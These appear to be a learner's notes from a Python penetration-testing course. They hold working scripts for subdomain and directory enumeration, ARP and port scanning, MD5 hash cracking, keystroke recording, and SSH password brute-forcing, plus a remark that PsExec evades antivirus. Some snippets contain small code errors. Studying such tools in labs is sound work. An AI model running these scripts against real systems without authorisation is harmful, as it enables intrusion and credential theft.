###################
#python pentesting#
###################

Request = simple http library 
scapy = send, sniff, dissect, and forge network packets
Pwntools = a CTF & exploit development library

if not installed you can use  	pip = its a python packet manager

for scapy = use = pip install scapy
---------------------------------------------------
tools to use = convert python script to windows executables = py2exe

protocol used for subdomain enumeration = DNS

function python use to get input from command line = sys.argv

Subdomain enumeration = the process of identifying and mapping 
the subdomains associated with a domain name.

Finding subdomains used by the target organization is an effective way to increase the attack surface and discover more vulnerabilities.

The script will use a list of potential subdomains and prepends them to the domain name provided via a command-line argument.
The script then tries to connect to the subdomains and assumes the ones that accept the connection exist.
the script also uses the wordlist provided subdomain.txt
-------------------------------------------------------------

import requests 
import sys 

sub_list = open("subdomains.txt").read() 
subdoms = sub_list.splitlines()

for sub in subdoms:
    sub_domains = f"http://{sub}.{sys.argv[1]}" 

    try:
        requests.get(sub_domains)
    
    except requests.ConnectionError: 
        pass
    
    else:
        print("Valid domain: ",sub_domains)   
-------------------------------------------------------
ONCE SUBDOMAIN have been discovered, next step would be to find directory
this code builds a simple directory enumeration tool
-------------------------------------------------------
import requests 
import sys 

sub_list = open("wordlist.txt").read() 
directories = sub_list.splitlines()

for dir in directories:
    dir_enum = f"http://{sys.argv[1]}/{dir}.html" 
    r = requests.get(dir_enum)
    if r.status_code==404: 
        pass
    else:
        print("Valid directory:" ,dir_enum)
---------------------------------------------------------

build simple ICMP scanner to find potential threats
ICMP = can be monitored or blocked
ARP = identify targets on local network is more effective
-----------------------------------------------------------
from scapy.all import *

interface = "eth0"
ip_range = "10.10.X.X/24"
broadcastMac = "ff:ff:ff:ff:ff:ff"

packet = Ether(dst=broadcastMac)/ARP(pdst = ip_range) 

ans, unans = srp(packet, timeout =2, iface=interface, inter=0.1)

for send,receive in ans:
        print (receive.sprintf(r"%Ether.src% - %ARP.psrc%"))  
----------------------------------------------------------------
python3 arp scan.py(file_name)

apt install python3-scapy

---------------------------------------------

import sys
import socket
import pyfiglet


ascii_banner = pyfiglet.figlet_format("TryHackMe \n Python 4 Pentesters \nPort Scanner")
print(ascii_banner)


ip = '192.168.1.6' 
open_ports =[] 

ports = range(1, 65535)          //ports that will be probed

//trys to connect to the port
def probe_port(ip, port, result = 1): 
  try: 
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM) 
    sock.settimeout(0.5) 
    r = sock.connect_ex((ip, port))   
    if r == 0: 
      result = r 
    sock.close() 
  except Exception as e: 
    pass 
  return result

//iterates through specific port listpyth
for port in ports: 
    sys.stdout.flush() 
    response = probe_port(ip, port) 
    if response == 0: 
        open_ports.append(port) 
    

if open_ports: 
  print ("Open Ports are: ") 
  print (sorted(open_ports)) 
else: 
  print ("Looks like no ports are open :(")
----------------------------------------------------------------
wget = good tool to download files = python can do it also
--------------------------------------------------------------
import requests

url = 'https://assets.tryhackme.com/img/THMlogo.png'
r = requests.get(url, allow_redirects=True)
open('THMlogo.png', 'wb').write(r.content)
------------------------------------------------
PSexec = allow system administrator to run commands on remote window system
also not detected by antivirus soft

----------------------------------------------------------------------------
HASH CRACKER
=============

import hashlib
import pyfiglet

ascii_banner = pyfiglet.figlet_format("TryHackMe \n Python 4 Pentesters \n HASH CRACKER for MD 5")
print(ascii_banner)

wordlist_location = str(input('Enter wordlist file location: '))
hash_input = str(input('Enter hash to be cracked: '))

with open(wordlist_location, 'r') as file:
    for line in file.readlines():
        hash_ob = hashlib.md5(line.strip().encode())    // trade md5 for sha256
        hashed_pass = hash_ob.hexdigest()
        if hashed_pass == hash_input:
            print('Found cleartext password! ' + line.strip())
            exit(0)
---------------------------------------------------------------------------
intstall keyboard module 	= pip3 install keyboard
-----------
import keyboard
keys = keyboard.record(until ='ENTER')
keyboard.play(keys)
---------------------
SSH password brute force attack script
==================================

import paramiko
import sys
import os

target = str(input('Please enter target IP address: '))
username = str(input('Please enter username to bruteforce: '))
password_file = str(input('Please enter location of the password file: '))

def ssh_connect(password, code=0):
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())

    try:
        ssh.connect(target, port=22, username=username, password=password)
    except paramiko.AuthenticationException:
        code = 1
    ssh.close()
    return code

with open(password_file, 'r') as file:
    for line in file.readlines():
        password = line.strip()
        
        try:
            response = ssh_connect(password)

            if response == 0:
                 print('password found: '+ password)
                 exit(0)
            elif response == 1: 
                print('no luck')
        except Exception as e:
            print(e)
        pass

input_file.close()
-----------------------------------------------------
paramiko = interact with ssh server on the target system
sys and os = provides with basic functionalities needed
to read a file from os (our password list in this case)
(do not need to import socket)

sys.argv[] = alrternate way to accept user input in argume




